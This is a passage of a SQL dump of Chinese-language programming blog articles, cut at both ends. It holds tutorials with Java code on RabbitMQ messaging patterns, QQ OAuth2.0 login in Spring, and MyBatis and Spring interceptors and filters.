*Binding*: Exchange和Queue之间的虚拟连接,binding中可以包含routingKey\n8. *RoutingKey*: 一个路由规则,虚拟机可用它来*确定如何路由一个特定消息*\n9. *Queue*: 也称MessageQueue,消息队列,保存消息并将它们转发给消费者\n \n### RabbitMQ消息生产消费模型\n1. *publisher*: 生产者将消息放入exchange\n2. *message*: 消息内容\n3. *exchange*: 交换机(很重要的东西)\n4. *queue*: 消息队列(一个exchange可以绑定多个queue)\n5. *consumer*: 消费者从queue中获取消息\n\n## RabbitMQ交换机类型-exchange\n#### rabbitMQ的交换机类型\n1. *DirectExchange*: RouteKye必须*完全匹配*才会被队列接收,否则该消息会被抛弃\n2. *TopicExchange*： Exchange将RouteKey和某Topic进行*模糊匹配*\n3. *FanoutExchange*： 发送到交换机的消息都会被转发到与该交换机*绑定的所有队列上*,*无需匹配*\n\n### DirectExchange\n####  生产端\n```java\npublic static void main(String[] args) throws Exception {\n		// 创建一个ConnectionFactory\n		ConnectionFactory connectionFactory = new ConnectionFactory();\n		connectionFactory.setHost(\"222.106.111.63\");\n		connectionFactory.setPort(5672);\n		connectionFactory.setUsername(\"guest\");\n		connectionFactory.setPassword(\"guest\");\n		connectionFactory.setVirtualHost(\"/\");\n		\n		// 通过连接工厂创建连接\n		Connection connection = connectionFactory.newConnection();\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		// 声明\n		String exchangeName = \"test_direct_exchange\";\n		String routingKey = \"test.direct\";\n		String msg = \"DirectExchange\";\n		// 发布一个消息,null的位置是可选配置 \n		channel.basicPublish(exchangeName, routingKey, null, msg.getBytes());\n		// 关闭连接\n		channel.close();\n		connection.close();\n	} \n```\n#### 消费端\n```java\npublic static void main(String[] args) throws Exception {\n		// 创建一个ConnectionFactory\n		ConnectionFactory connectionFactory = new ConnectionFactory();\n		connectionFactory.setHost(\"222.106.111.63\");\n		connectionFactory.setPort(5672);\n		connectionFactory.setUsername(\"guest\");\n		connectionFactory.setPassword(\"guest\");\n		connectionFactory.setVirtualHost(\"/\");\n\n		connectionFactory.setAutomaticRecoveryEnabled(true);\n		connectionFactory.setNetworkRecoveryInterval(3000);\n		// 通过连接工厂创建连接\n		Connection connection = connectionFactory.newConnection();\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		\n		String exchangeName = \"test_direct_exchange\";\n		// routingKey必须完全匹配\n		String routingKey = \"test.direct\";\n		// exchange类型\n		String type = \"direct\";\n		String queueName = \"test_direct_queue\";\n		// 声明了一个交互机,后面是可选参数\n		channel.exchangeDeclare(exchangeName, type, true, false, false, null);\n		// 声明了一个队列\n		channel.queueDeclare(queueName, false, false, false, null);\n		// 建立绑定关系\n		channel.queueBind(queueName, exchangeName, routingKey);\n		\n		QueueingConsumer consumer = new QueueingConsumer(channel);\n		channel.basicConsume(queueName, true, consumer);\n		while (true) {\n			Delivery delivery = consumer.nextDelivery();\n			String msg = new String(delivery.getBody());\n			System.out.println(\"accpet:\" + msg);\n		}\n	}\n```\n##### 所有发送到DirectExchange的消息被转发到RouteKey中指定的Queue\n##### 注意:Direct模式可以使用RabbitMQ自带的Exchange:defaultExchange,所以不需要将Exchange进行任何绑定(binding)操作,消息传递时,*RouteKye必须完全匹配*才会被队列接收,否则该消息会被抛弃   \n\n### TopicExchange\n#### 生产端\n```java\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		// 声明\n		String exchangeName = \"test_topic_exchange\";\n		String routingKey1 = \"user.save\";\n		String routingKey2 = \"user.update\";\n		String routingKey3 = \"user.delete.abc\";\n		// 发送\n		String msg = \"TopicExchange\";\n		channel.basicPublish(exchangeName, routingKey1, null, msg.getBytes());\n		channel.basicPublish(exchangeName, routingKey2, null, msg.getBytes());\n		channel.basicPublish(exchangeName, routingKey3, null, msg.getBytes());\n		// 关闭连接\n		channel.close();\n		connection.close();\n	}\n```\n#### 消费端\n```java\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		// 声明\n		String exchangeName = \"test_topic_exchange\";\n		String type = \"topic\";\n		String queueName = \"test_topic_queue\";\n		\n		String routingKey = \"user.#\";\n		channel.exchangeDeclare(exchangeName, type, true, false, false, null);\n		channel.queueDeclare(queueName, false, false, false, null);\n		channel.queueBind(queueName, exchangeName, routingKey);\n		QueueingConsumer consumer = new QueueingConsumer(channel);\n		channel.basicConsume(queueName, true, consumer);\n		while (true) {\n			Delivery delivery = consumer.nextDelivery();\n			String msg = new String(delivery.getBody());\n			System.out.println(\"accpet:\" + msg);\n		}\n	}\n```\n\n1. 所有发送到TopicExchange的消息被转发到所有关心RouteKey中指定Topic的Queue上\n2. Exchange将RouteKey和某Topic进行*模糊匹配*\n##### 注意:可以使用通配符进行模糊匹配\n1. \"#\" 匹配一个或多个词,\"能够匹配到\"log.info.oa\"\n2. \"*\" 匹配不多不少一个词,\"只够匹配到\"log.erro\"\n\n### FanoutExchange\n#### 生产端\n```java\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		// 声明\n		String exchangeName = \"test_fanout_exchange\";\n		String msg = \"FanoutExchange\";\n		channel.basicPublish(exchangeName, \"\", null, msg.getBytes());\n		\n		// 关闭连接\n		channel.close();\n		connection.close();\n	}\n```\n\n#### 消费端\n```java\n public static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		\n		String exchangeName = \"test_fanout_exchange\";\n		String type = \"fanout\";\n		String queueName = \"test_fanout_queue\";\n		String routingKey = \"\";\n		channel.exchangeDeclare(exchangeName, type, true, false, false, null);\n		channel.queueDeclare(queueName, false, false, false, null);\n		channel.queueBind(queueName, exchangeName, routingKey);\n		\n		QueueingConsumer consumer = new QueueingConsumer(channel);\n		channel.basicConsume(queueName, true, consumer);\n		while (true) {\n			Delivery delivery = consumer.nextDelivery();\n			String msg = new String(delivery.getBody());\n			System.out.println(\"accpet:\" + msg);\n		}\n	}\n\n```\n1. 不处理路由键,只需要简单的将队列*绑定到交换机*上 \n2. 发送到交换机的消息都会被转发到与该交换机*绑定的所有队列上*\n3. Fanout交换机转发消息是最快\n\n## 其他属性\n### 创建属性\n##### 这些属性一般在创建connectionFactory,exchange和queue使用,也就是上面布尔参数列表,具体参数对应API源码中有说明\n1. VirtualHost: 虚拟地址,用于进行逻辑隔离(就像redis的16个db),最上层的消息路由\n2. Exchange: 接收消息,并根据路由键转发消息所绑定的队列\n3. Name: 交换机名称\n4. Type: 交换机类型 direct,topic,fanout,headers\n5. Durability: 是否持久化,Durable:是,Transient:否\n6. AutoDelete: 当最后一个绑定到Exchange上的队列删除后,自动删除该Exchange\n7. Internal: 当前Exchange是否用于RabbitMQ内部使用,默认为false\n8. Arguments: 扩展参数,用于扩展AMQP协议自制定化使用 \n\n### 生产者发送时的额外参数Properties\n#### 生产端\n```java\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		// 附加头\n		Map<String, Object> headers = new HashMap<String, Object>();\n		headers.put(\"set1\", \"set1\");\n		headers.put(\"set2\", \"set2\");\n		// 参数设置\n		BasicProperties props = new AMQP.BasicProperties.Builder()\n		.deliveryMode(2)\n		.contentType(\"UTF-8\")\n		.expiration(\"10000\")\n		// 携带附加头\n		.headers(headers)\n		.build();\n		\n		String msg = \"Hello Rabbitmq\";\n		// 1.exchange 2.routingKey\n		channel.basicPublish(\"\", \"test001\", props, msg.getBytes());\n		// 关闭连接\n		channel.close();\n		connection.close();\n	}\n```\n#### 消费端 \n```java\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 创建一个Channel\n		Channel channel = connection.createChannel();\n		// 创建一个队列\n		// 是否持久化,是否独占,脱离绑定关系后是否删除,扩展参数\n		String queueName = \"test001\";\n		channel.queueDeclare(queueName, true, false, false, null);\n		// 创建消费者\n		QueueingConsumer queueingConsumer = new QueueingConsumer(channel);\n		channel.basicConsume(queueName, true, queueingConsumer);\n		// 获取消息\n		while(true) {\n			Delivery delivery = queueingConsumer.nextDelivery();\n			String msg = new String(delivery.getBody());\n			System.err.println(\"消费端:\" + msg);\n			// 取出headers\n			Map<String, Object> headers = delivery.getProperties().getHeaders();\n			System.out.println(\"headrs get set1-value: \"+headers.get(\"set1\"));\n		}\n	}\n```\n\n1. deliveryMode(持久化)\n2. headers(自定义属性)\n3. content_type(内容类型)\n4. content_encoding(编码)\n\n## 应用功能\n### 回调消息 \n```java \n		// 此处省略connection创建...\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		\n		// 指定确认模式\n		channel.confirmSelect();\n		String exchangeName = \"test_confirm_exchange\";\n		String routingKey = \"confirm.save\";\n		\n		String msg = \"confirmMsg\";\n		channel.basicPublish(exchangeName, routingKey, null, msg.getBytes());\n		\n		// 添加一个确认\n		channel.addConfirmListener(new ConfirmListener() {\n			@Override\n			public void handleNack(long deliveryTag, boolean multiple) throws IOException {\n				System.err.print(\"---------no ack------------\");\n			}\n			@Override\n			public void handleAck(long deliveryTag, boolean multiple) throws IOException {\n				System.err.print(\"---------ack------------\");\n			}\n		});\n``` \n1. 消息的确认,是指生产者投递消息后,如果Broker收到消息,*则会给我们生产者一个应答*\n2. 生产者进行接收应答,用来确认这条消息是否正常的发送的Broker,这种方式也是消息的*可靠性投递的核心保障*\n\n### 默认队列\n```java\n		// 此处省略connection创建...\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		\n		// 指定确认模式\n		channel.confirmSelect();\n		String exchangeName = \"test_return_exchange\";\n		String routingKey = \"return.save\";\n		String routingKeyError = \"err.save\";\n		\n		String msg = \"confirmMsg\";\n		// 不可达\n		channel.addReturnListener(new ReturnListener() {\n			@Override\n			public void handleReturn(int replyCode, String replyText, String exchange, String routingKey,\n		        AMQP.BasicProperties properties, byte[] body)\n					throws IOException {\n				System.err.println(\"--------handler return-----------\");\n				System.out.println(\"replyCode: \" + replyCode);\n				System.out.println(\"replyText: \" + replyText);\n				System.out.println(\"exchange: \" + exchange);\n				System.out.println(\"routingKey: \" + routingKey);\n				System.out.println(\"properties: \" + properties);\n				System.out.println(\"body: \" + new String(body));\n			}\n		});\n		// channel.basicPublish(exchangeName, routingKey, true, null, msg.getBytes());\n		channel.basicPublish(exchangeName, routingKeyError, true, null, msg.getBytes());\n\n```\n1. ReturnListener用于*处理一些不可路由的消息*\n2. 我们的消息生产者,通过指定Exchange和RoutingKey,把消息送达到某一个队列中去,然后我们的消费者队列监听队列,进行消费处理操作\n3. 但是在某些情况下,如果我们在发送消息的时候,当前的exchange不存在或者指定的路由key*路由不到*,这个时候如果我们需要监听这种b不可达的消息,就要使用ReturnListener\n4. 在基础API中有一个关键的配置项,*Mandatory*: 如果为true,则监听器会接收到路由不可达的消息,然后进行后续处理,如果为false,那么broker端自动删除该消息 \n\n### 消息限流与手工签收\n```java\n	// arg1: prefetchSize: 大小,\n	// arg2: prefetchCount: 会告诉RabbitMQ不要同时给一个消费者推送多于N个消息,即一旦有N个消息还没有ack,则该consumer将block掉,直到有消息ack\n	// arg3: global: true\\false是否将上面设置只应用于channel,简单点说,就是上面限制是channel级别的还是consumer级别\n	channel.basicQos(0, 1, false);\n	\n	// arg1: 队列名称	\n	// arg2: 是否自动签收,必须要关闭\n	// arg3: 自定义的消费处理器\n	channel.basicConsume(queueName, false, new MyConsumer(channel));\n```\n#### 为什么要关闭自动签收 \n1. 假设一个场景,首先,我们RabbitMQ服务器有上万条未处理的消息,我们随便打开一个消费者客户端,会出现下面情况\n2. 巨量的消息瞬间全部推送过来,但是我们单个客户端无法同时处理这么多数据,服务器可能会宕机\n3. RabbitMQ提供了一种qos(服务质量保证)功能,即在非自动确认消息的前提下,如果一定数目的消息(通过基于consumer或channel设置Qos)*未被确认前,不进行消费新的消息*\n4. 消费端进行消费的时候,如果由于业务异常我们可以进行日志的记录,然后进行补偿\n5. 如果由于服务器宕机等严重问题,那我们就需要手工补偿进行ACK保障消费端消费成功\n\n### 消费端的重回队列\n1. 消费端重回队列是为了对没有处理成功的消费,把消息重新传递给Broker,*会重回队列的尾部*\n2. 一般我们在实际应用中,都会关闭重回队列(因为没有意义),也就是设置为false\n\n### 死信队列(DLX)与消息生命周期(TTL)\n#### 死信队列接收什么消息\n1. 消息被拒绝(basic.reject/basic.nack)并且requeue(重回队列)=false\n2. 消息生命周期过期\n3. 目标队列达到最大长度,已阻塞\n4. 当某队列中有死信时,RabbitMQ就会自动的将这个消息重新发布到设置的Exchange上去,进而被路由到死信队列\n5. 死信队列也是一个正常的Exchange,和一般的Exchange没有区别,它能在任何的队列上被指定,实际上就是设置某个队列的属性\n\n#### 给正常队列配置死信队列\n```java\n	// 此处省略connection创建...\n	// 通过connection创建Channel\n	Channel channel = connection.createChannel();\n		\n	String exchangeName = \"test_dlx_exchange\";\n	String type = \"topic\";\n	String routingKey = \"dlx.#\";\n	String queueName = \"test_dlx_queue\";\n		\n	String dlxExchangeName = \"dlx.exchange\";\n	String dlxQueueName = \"dlx.queue\";\n	String dlxRoutingKey = \"#\";\n		\n	channel.exchangeDeclare(exchangeName, type, true, false, null);\n	Map<String, Object> arguments = new HashMap<String, Object>();\n	// 要进行死信队列的声明\n	arguments.put(\"x-dead-letter-exchange\", dlxExchangeName);\n		\n		\n	// !!注意,这个arguments属性,要设置到声明正常队列上\n	channel.queueDeclare(queueName, true, false, false, arguments);\n	channel.queueBind(queueName, exchangeName, routingKey);\n		\n	// !!注意,要进行死信队列的声明\n	channel.exchangeDeclare(dlxExchangeName, type, true, false, null);\n	channel.queueDeclare(dlxQueueName, true, false, false, null);\n	channel.queueBind(dlxQueueName, dlxExchangeName, dlxRoutingKey);\n\n	channel.basicQos(0, 1, false);\n	channel.basicConsume(queueName, false, new MyConsumer(channel)); \n```\n\n### 各种类型消息\n#### 消息类型\n1. 迅速消息\n2. 可用消息\n3. 批量消息\n4. 延迟消息\n5. 顺序消息\n6. 事务消息\n\n#### 迅速消息\n1. 迅速消息是指消息不进行落库存储,不做可靠性的保障\n2. 在一些非核心消息,日志数据,或者统计分析等场景下比较合适\n3. 迅速消息的优点就性能最高,吞吐量最大\n\n#### 可用消息\n1. 依靠回调可靠性投递补偿方案\n\n#### 批量消息\n1. 批量消息是指我们把消息放到一个集合里统一进行提交,这种方案设计思路是期望消息在一个会话里,比如投掷到threadlocal里集合<SessionId,List>\n2. 因为拥有相同会话ID,并且带有这次提交消息的SIZE等相关属性,最重复的一点是要把这一批消息进行合并.对于Channel而言,就是发送一次消息.\n3. 这种方式也是希望消费端在消费的时候,可以进行批量化的消费,针对于某一个原子业务的操作去处理,但是不保障可靠性,需要进行补偿机制\n\n#### 延迟消息\n1. 延迟消息需要添加RabiitMQ插件,接着就是在我们在Message封装的时候添加过期时间属性即可,使得我们的消息可以进行延迟发送\n2. 根据具体的业务场景也可以很好的使用到.比如你在电商平台买到商品签收后,不点击确认支付,那么系统自动会在7天(一定时间)去进行自动支付操作,还有一些自动超时作废的场景,你的优惠劵/红包有使用时间限制,也可以用延迟消息机制\n\n#### 顺序消息\n1. 顺序消息,比较类似于批量消息的实现机制,但是也有些不同\n2. *发送的顺序消息,必须保障消息投递到同一个队列,且这个消费者只能有一个(独占模式)*\n3. 添加消息属性:顺序标记的序号,和本次顺序消息的SIZE属性\n\n#### 事务消息\n1. 事务消息大都属于分布式事务处理方面\n2. 无法保证强一致性,而是最终一致性,期间出现base理论中的软状态\n3. 依靠队列的持久化存储与幂等性处理来解决\n\n\n## 一致性解决方案\n### 保证可靠性投递\n#### 什么是生产端的可靠性投递?\n1. 保障消息的成功发出\n2. 保障MQ节点的成功接收\n3. 发送端收到MQ节点的成功应答\n4. *完善的消息补偿机制*\n\n#### 第一种处理: 消息落库,对消息状态进行打标,进行两次入库\n![reliable1.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544845216_reliable1.png)\n1. 发送前对消息进行入库,业务库和消息库\n2. 生产端发送消息至消息队列\n3. 消息队列接收后确认消息并返回回调至生产端 \n4. 生成端接收回调后对指定消息(*根据correlationData唯一id*)进行确认并修改消息库状态\n5. 当期间遇到问题导致过程失败时的消息status状态依然为0,而不是成功的1\n6. 运行分布式的作业定时任务(elasticjob),*每一定时间内检查状态为0的消息*并让生成端重新发送这些失败的消息\n7. 重试次数大于3次仍然失败的消息,status改为2,手工进行处理\n \n#### 第二种处理: 消息的延迟投递,做二次确认,回调检查,callbackService作为中间件\n![reliable2.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544845216_reliable2.png)\n1. 发送前对消息进行入库,业务库\n2. 第一次将*直接发送消息A*,并在随后一段时间内后发送一条*对应的延迟消息B*\n3. DownStreamServer接收到了A消息,并转发发送给消息队列,CallbakcService*接收这条转发的消息*,还需要等待延迟消息B的到来,如果B也来了,那么对消息库进行修改,如果没有来,那么不对消息库进行修改,*让生产端重新发送消息*\n4. 实现复杂\n\n### 常见问题\n#### 幂等性问题\n1. 幂等性即为唯一,不会重复,是解决重复消费的重要理论\n2. 解决方式使用全局id状态+日志记录+定时job健康状态补偿+分布式锁(极端情况)\n\n#### 消费者宕机,而且没有高可用,生产者一直发送消息,怎么处理\n1. 消息会被缓存在消息中间件队列中并持久化,关闭自动签收,定时调度执行补偿,处理幂等性问题\n\n#### 保证一致性\n1. 消费采用手动ACK应答方式,已confirm机制确认消息送达,采用MQ进行补偿重试机制,注意MQ补偿幂等性等问题\n\n#### 实现分布式事务\n1. 利用补单机制,达成最终一致性来保证分布式事务', 2, 2, 141, 0, 0, '2018-09-16 14:14:01', '2019-03-25 23:21:47', 0, 0);
INSERT INTO `article` VALUES (29, 1, 'OAuth2.0登录', '2018/9/1537245774_52323c7f138827816fb40c0186640a63.jpg', '## 概念\r\n### OAuth2.0是什么 \r\n1. 一种向第三方开发用户信息查询的协议\r\n2. QQ,微信,微博,GitHub,淘宝等都对该协议支持\r\n\r\n### OAuth2.0的流程\r\n#### QQ所提供的OAuth2流程\r\n![qqauth.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546588950_qqauth.png)\r\n#### 大致所需步骤\r\n1. 前往QQ互联(https://connect.qq.com/index.html), 请求审核通过,创建应用,获得应用id等相关信息\r\n2. 当用户点击QQ登录按钮时,本站后端生成授权码链接,此步需要提供审核后的应用id等相关信息\r\n3. 用授权码链接重定向浏览器至QQ授权页面,等待用户QQ登录\r\n4. 用户确认登录后,QQ会向审核时的本站回调地址处发送授权码\r\n5. 本站回调中需要将接收到的授权码再次连同应用相关信息向QQ索取accessToken,获取accessToken后再次向QQ索取openId(QQ对本站应用的用户唯一id)\r\n6. 利用accessToken+openId+本站应用信息再次请求QQ索要用户QQ相关信息(QQ名称,QQ头像)\r\n\r\n## 步骤实现\r\n### 引包\r\n```xml\r\n<!-- maven中央仓库中不存在QQ的jar包,需要自己去找并添加至本地maven仓库-->\r\n<!-- mvn install:install-file -Dfile=F:/jar/Sdk4J.jar -DgroupId=com.sdk4j -DartifactId=sdk4j -Dversion=1.0 -Dpackaging=jar -->\r\n<dependency>\r\n	<groupId>com.sdk4j</groupId>\r\n	<artifactId>sdk4j</artifactId>\r\n	<version>1.0</version>\r\n</dependency>\r\n```\r\n### 填写配置文件\r\n```xml\r\napp_ID = // 应用id\r\napp_KEY =  // 应用密钥\r\nredirect_URI = http://127.0.0.1/qqLoginCallback // QQ发送授权码的本站回调地址\r\n\r\n// 一些QQ提供的参数\r\nscope = get_user_info,add_topic,add_one_blog,add_album,upload_pic,list_album,add_share,check_page_fans,add_t,add_pic_t,del_t,get_repost_list,get_info,get_other_info,get_fanslist,get_idollist,add_idol,del_ido,get_tenpay_addr\r\nbaseURL = https://graph.qq.com/\r\ngetUserInfoURL = https://graph.qq.com/user/get_user_info \r\n```\r\n\r\n\r\n### 生成授权码链接\r\n```java\r\n/**\r\n* 生成获取QQ授权的链接并让浏览器重定向\r\n* \r\n* @return\r\n* @throws QQConnectException\r\n*/\r\n@RequestMapping(\"/locaQQLogin\")\r\npublic String locaQQLogin(HttpServletRequest request) throws QQConnectException {\r\n	// QQ封装,会读取配置并生成授权链接\r\n	String authorizeURL = new Oauth().getAuthorizeURL(request);\r\n	// 让用户浏览器重定向去QQ提供的授权链接\r\n	return \"redirect:\" + authorizeURL;\r\n}\r\n```\r\n### 用户在QQ授权链接中确认登录,QQ向本站的回调\r\n```java\r\n/**\r\n	 * 获取授权码code 使用授权码code获取accessToken 使用accessToken获取openId 是否已关联账号\r\n	 * \r\n	 * @param request\r\n	 * @return\r\n	 * @throws QQConnectException\r\n	 */\r\n	@RequestMapping(\"/qqLoginCallback\")\r\n	public String qqLoginCallback(HttpServletRequest request, HttpServletResponse response, HttpSession session)\r\n			throws QQConnectException {\r\n		// QQ封装,使用授权码请求获取accessToken请求结果\r\n		AccessToken accessTokenByRequest = new Oauth().getAccessTokenByRequest(request);\r\n		if (accessTokenByRequest == null) {\r\n			request.setAttribute(\"error\", \"QQ授权失败\");\r\n			return ERROR;\r\n		}\r\n		// accessToken\r\n		String accessToken = accessTokenByRequest.getAccessToken();\r\n		// QQ封装,使用accessToken获取用户对本站应用的唯一id(openId)\r\n		OpenID openIDObj = new OpenID(accessToken);\r\n		// 获取QQ为本站应用提供的唯一用户id\r\n		String userOpenID = openIDObj.getUserOpenID();\r\n	} \r\n```\r\n### 获取用户信息\r\n```java\r\nString userOpenID = openIDObj.getUserOpenID();\r\n// 该openId是否已是绑定本站用户\r\nInteger exist  = this.memberServiceFeign.findByOpenIdUser(userOpenID);\r\nif (exist > 0) {\r\n	// 已经用QQ账号绑定过本站\r\n	// 通过openId查找用户并按正常登录逻辑,设置token等..\r\n} else {\r\n	// 没有绑定过本站\r\n	// 引导去用户补充信息或向QQ请求用户的QQ昵称,头像等信息直接帮用户注册一个本站账号\r\n}\r\n```\r\n\r\n## 提供者\r\n### 假设是第三方授权提供者\r\n#### 设计本站授权表基本字段\r\n1. AppId: (第三方合作机构)用于区分不同的机构,*永不改变*\r\n2. AppSecret: 传输中实现加密功能(密钥),*可以发生改变*\r\n3. AppName: 对方机构名称\r\n4. Is_flag: 是否可用\r\n5. accessToken: 记录最新accessToken\r\n\r\n#### 提供者步骤如根据OAuth2.0协议所示\r\n1. 是否存在该第三方机构,是否可用\r\n2. AppId+AppSecret对应生成授权码\r\n3. 根据对方的授权码获取accessToken(只能使用一次)\r\n4. 向对方提供相关数据', 2, 0, 124, 0, 0, '2018-09-18 12:43:00', '2019-02-22 00:22:37', 0, 0);
INSERT INTO `article` VALUES (30, 1, 'Spring的一些工具技巧', '2018/10/1540203098_d37f3a794867b88d289331737ee75379.jpg', '# 前言\n本文记录Spring一些相关技巧\n## 拦截器,过滤器\n##### 拦截器就是责任链,洋葱模型的一种实现,执行前和执行后做一些事情,逼格点讲就如面向切面,其实不难理解.该文章*主要为记录*\n### MyBatis拦截器\nMyBatis拦截机制一般是用于SQL冗余的时候,在执行SQL前对SQL语句进行加工。但这需要对源码结构有清楚的认识。  \n以一个分页拦截器为例子\n```java\n// 需要拦截的类 方法 参数;\n@Intercepts({@Signature(type=StatementHandler.class,method=\"prepare\",args={Connection.class})})\npublic class PageInterceptor implements Interceptor{\n	@Override\n	public Object intercept(Invocation invocation) throws Throwable {\n		// 决定拦截下来的对象\n		StatementHandler statementHandler = (StatementHandler) invocation.getTarget();\n		// 反射拿到RoutingStatementHandler-BaseStatementHandler中的MappedStatement\n		// MappedStatement存储了配置文件中sql的id\n		MetaObject metaObject = MetaObject.forObject(statementHandler, SystemMetaObject.DEFAULT_OBJECT_FACTORY, SystemMetaObject.DEFAULT_OBJECT_WRAPPER_FACTORY);\n		MappedStatement mappedStatement = (MappedStatement) metaObject.getValue(\"delegate.mappedStatement\");\n		// 拿到sql语句的id\n		String id = mappedStatement.getId();\n		if(id.matches(\".+ByPage$\")) {\n			// 存储sql语句的对象\n			BoundSql boundSql = statementHandler.getBoundSql();\n			// 原始sql语句\n			String sql = boundSql.getSql();\n			// 查询总条数的sql语句，子查询\n			String countSql = \"select count(*) from (\" + sql + \")a\";\n			// 获得拦截对象的参数\n			Connection conn = (Connection) invocation.getArgs()[0];\n			PreparedStatement countStatement = conn.prepareStatement(countSql);\n			// 获取参数设置方法\n			ParameterHandler parameterHandler = (ParameterHandler) metaObject.getValue(\"delegate.parameterHandler\");\n			parameterHandler.setParameters(countStatement);\n			ResultSet rs = countStatement.executeQuery();\n			// 得到传给配置文件的参数\n			Map<?,?> parameter = (Map<?, ?>) boundSql.getParameterObject();\n			Page page = (Page) parameter.get(\"page\");\n			// 执行查询总条数的sql语句\n			if (rs.next()) {\n				page.setTotalNumber(rs.getInt(1));;\n			}\n			// 改造后带分页查询的语句\n			String pageSql = sql + \" limit \" + page.getDbIndex() + \",\" + page.getDbNumber();\n			// 修改sql\n			metaObject.setValue(\"delegate.boundSql.sql\", pageSql);\n		}\n		// 放出对象\n		return invocation.proceed();\n	} \n\n	@Override\n	public Object plugin(Object target) {\n		\n		// mybatis通过这个返回方法得到本拦截器的@Intercepts注解\n		// 不属于mybatis管理内的类会直接返回，不会运行上面的intercept方法\n		return Plugin.wrap(target, this);\n	}\n\n	@Override\n	public void setProperties(Properties properties) {\n		// 可获得注册拦截器时设置的数据\n		this.test = properties.getProperty(\"test\");\n	} \n\n}\n\n```\n需要在MyBatis的*Configuration.xml*中定义拦截器\n```shell\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE configuration\n  PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n  \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n<configuration>\n\n	<plugins>\n	<!-- 这里设置的属性可以被上面拦截器的setProperties方法中拿到 --> \n		<plugin interceptor=\"root.interceptor.PageInterceptor\">\n			<property name=\"test\" value=\"abc\"/>\n		</plugin>\n	</plugins>\n</configuration>\n```\n\n### 传统Servlet过滤器\n##### servlet的过滤器就是很经典的拦截器,不过servlet过滤器很少使用\n##### servlet过滤器是独立于Javaweb的,和Spring没有半毛钱关系,所以只能拿到request和response*无法拿到放行之后的那个执行方法的类*,所以使用率很低,而且一些情况下没注意会造成内存泄漏和堆积\n```java\npublic class TimeFilter implements Filter{\n\n	// 过滤器被创建时\n	@Override\n	public void init(FilterConfig filterConfig) throws ServletException {\n		System.out.println(\"time filter init\");\n	}\n\n	// 过滤器执行时\n	@Override\n	public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)\n			throws IOException, ServletException {\n		System.out.println(\"time filter start\");\n		long start = new Date().getTime();\n		chain.doFilter(request, response);\n		System.out.println(\"time filter\" + (new Date().getTime()-start));\n		System.out.println(\"time filter finish\");\n	}\n	// 过滤器被销毁时\n	@Override\n	public void destroy() {\n		System.out.println(\"time filter destroy\");\n	}\n} \n// 传统SpringMVC在web.xml配置过滤器\n	<filter>\n	  <filter-name>TimeFilter</filter-name>  \n	  <filter-class>root.filter.TimeFilter</filter-class>\n	</filter> \n	<filter-mapping>  \n	<filter-name>TimeFilter</filter-name>\n	   <url-pattern>/*</url-pattern>\n	</filter-mapping>\n\n// SpringBoot配置过滤器\n@Configuration\npublic class FilterConfig {\n	@Bean\n	public FilterRegistrationBean ThreadFilter() {\n		FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean();\n		filterRegistrationBean.setOrder(1);\n		filterRegistrationBean.setFilter(new ThreadRequestFilter());\n		List<String> urlList = new ArrayList<String>();\n		urlList.add(\"/*\");\n		filterRegistrationBean.setUrlPatterns(urlList);\n		return filterRegistrationBean;\n	}\n} \n```\n### Spring的拦截器\n##### 这应该是最常用的拦截器,大部分的需求功能都能完成,虽然在分布式的情况下一般是有*网关服务来做这些事情的*\n##### 可以拿到request和response,*并且可以拿到执行方法的那个类,根据请求路径和请求方法就可以得到那个执行的方法,但无法获取执行方法时的参数*,然后做一些其他操作,比如读取执行方法的注解之类的事\n```java\npublic class TimeIntercpetor implements HandlerInterceptor {\n	\n	// 执行方法前 \n	@Override\n	public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler)\n			throws Exception {\n		System.out.println(\"preHandle\");\n		System.out.println(((HandlerMethod)handler).getBean().getClass().getName());\n		System.out.println(((HandlerMethod)handler).getMethod().getName());\n		request.setAttribute(\"startTime\", new Date().getTime());\n		return true;\n	}\n	// 返回结果前\n	@Override\n	public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler,\n			ModelAndView modelAndView) throws Exception {\n		System.out.println(\"postHandle\");\n		Long start = (Long) request.getAttribute(\"startTime\");\n		System.out.println(\"time intercpetor\" + (new Date().getTime()-start));\n	}\n\n	// 无论是否出现异常都会被调用\n	@Override\n	public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)\n			throws Exception {\n		System.out.println(\"afterCompletion\");\n		Long start = (Long) request.getAttribute(\"startTime\");\n		System.out.println(\"\" + (new Date().getTime()-start));\n		System.out.println(\"ex is\" + ex);\n	}\n}\n\n// 传统SpringMvc配置Spring拦截器\n<mvc:interceptors>\n	<mvc:interceptor>\n		<mvc:mapping path=\"/sys/**\"/>\n		<mvc:exclude-mapping path=\"/sys/login\"/>\n		<mvc:exclude-mapping path=\"/sys/quitlogin\"/>\n		<bean class=\"root.Interceptor.TimeIntercpetor\"></bean>\n	</mvc:interceptor> \n</mvc:interceptors>   \n// SpringBoot中配置Spring拦截器\n@Configuration\npublic class WebMvcConfig extends WebMvcConfigurerAdapter  {\n	@Bean\n    public HttpFilter getTimeIntercpetor () {\n        return new TimeIntercpetor();\n    }\n	\n    @Override\n    public void 